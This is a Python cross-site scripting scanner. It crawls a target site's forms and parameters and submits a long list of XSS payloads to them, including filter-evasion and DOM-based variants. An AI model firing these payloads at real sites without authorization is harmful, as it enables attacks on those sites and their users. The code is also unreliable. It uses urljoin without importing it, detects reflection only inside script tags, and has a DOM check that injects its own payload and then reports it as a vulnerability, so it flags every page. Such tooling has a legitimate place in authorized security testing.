import re
import json
import random
import string
from bs4 import BeautifulSoup
import requests

class XSSScanner:
    def __init__(self, target, aggressive=True):
        self.target = target
        self.aggressive = aggressive
        self.vulnerabilities = []
        self.payloads = self._generate_payloads()
        
    def _generate_payloads(self):
        """Generate XSS payloads for 2026"""
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>X",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "<marquee onstart=alert('XSS')>X</marquee>"
        ]
        
        if self.aggressive:
            # Advanced evasion techniques
            evasions = [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x oneonerrorrror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<script>eval('al'+'ert(\\'XSS\\')')</script>",
                "<div style=\"background:url(javascript:alert('XSS'))\">",
                "<link rel=stylesheet href=javascript:alert('XSS')>",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<table background=\"javascript:alert('XSS')\"></table>",
                "<input type=\"image\" src=\"javascript:alert('XSS')\">",
                "<isindex action=\"javascript:alert('XSS')\" type=image>",
                "<a href=\"javas&#99;ript:alert('XSS')\">click</a>",
                "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">click</a>"
            ]
            
            # DOM-based XSS
            dom_payloads = [
                "#<script>alert('XSS')</script>",
                "?param=<script>alert('XSS')</script>",
                "#javascript:alert('XSS')",
                "#{alert('XSS')}",
                "#`${alert('XSS')}`"
            ]
            
            base_payloads.extend(evasions + dom_payloads)
            
        return base_payloads
    
    def scan(self):
        """Execute comprehensive XSS scan"""
        print(f"[XSS] Scanning {self.target}...")
        
        # Spider for input points
        input_points = self._discover_input_points()
        
        # Test each point
        for point in input_points:
            self._test_input_point(point)
            
        # DOM XSS scanning
        if self.aggressive:
            self._scan_dom_xss()
            
        return {
            "target": self.target,
            "vulnerabilities": self.vulnerabilities,
            "count": len(self.vulnerabilities),
            "risk_level": "HIGH" if self.vulnerabilities else "LOW"
        }
    
    def _discover_input_points(self):
        """Discover all possible input points"""
        points = []
        
        try:
            response = requests.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # Get input fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                input_names = [inp.get('name') for inp in inputs if inp.get('name')]
                
                if input_names:
                    points.append({
                        'type': 'form',
                        'action': urljoin(self.target, action),
                        'method': method,
                        'inputs': input_names
                    })
            
            # Find URL parameters
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            
            if params:
                points.append({
                    'type': 'url_params',
                    'params': list(params.keys())
                })
                
            # Find AJAX endpoints
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Look for AJAX calls
                    if 'ajax' in script.string.lower() or 'fetch' in script.string.lower():
                        # Extract URLs (simplified)
                        urls = re.findall(r'["\'](https?://[^"\']+)["\']', script.string)
                        for url in urls:
                            points.append({
                                'type': 'ajax',
                                'url': url
                            })
                            
        except Exception as e:
            print(f"[XSS] Discovery error: {e}")
            
        return points
    
    def _test_input_point(self, point):
        """Test a specific input point for XSS"""
        import requests
        
        for payload in self.payloads[:30]:  # Limit for performance
            try:
                if point['type'] == 'form':
                    # Test form submission
                    data = {}
                    for inp in point['inputs']:
                        data[inp] = payload
                        
                    if point['method'] == 'get':
                        response = requests.get(point['action'], params=data, timeout=5)
                    else:
                        response = requests.post(point['action'], data=data, timeout=5)
                        
                elif point['type'] == 'url_params':
                    # Test URL parameters
                    test_url = f"{self.target}?{point['params'][0]}={payload}"
                    response = requests.get(test_url, timeout=5)
                    
                else:
                    continue
                    
                # Check if payload is reflected
                if payload in response.text:
                    # Check if payload executed
                    soup = BeautifulSoup(response.text, 'html.parser')
                    scripts = soup.find_all('script')
                    
                    for script in scripts:
                        if payload in str(script):
                            self.vulnerabilities.append({
                                'type': 'Reflected XSS',
                                'point': point,
                                'payload': payload,
                                'url': response.url
                            })
                            break
                            
            except Exception:
                continue
    
    def _scan_dom_xss(self):
        """Scan for DOM-based XSS using headless browser"""
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            
            driver = webdriver.Chrome(options=options)
            driver.get(self.target)
            
            # Inject and check
            test_script = """
            var payload = '<img src=x onerror=console.log("XSS_DETECTED")>';
            document.body.innerHTML += payload;
            """
            
            driver.execute_script(test_script)
            
            # Check logs (simplified)
            logs = driver.get_log('browser')
            for log in logs:
                if 'XSS_DETECTED' in str(log):
                    self.vulnerabilities.append({
                        'type': 'DOM-based XSS',
                        'method': 'Selenium injection',
                        'details': 'Console log triggered'
                    })
                    
            driver.quit()
            
        except Exception as e:
            print(f"[XSS] DOM scan error: {e}")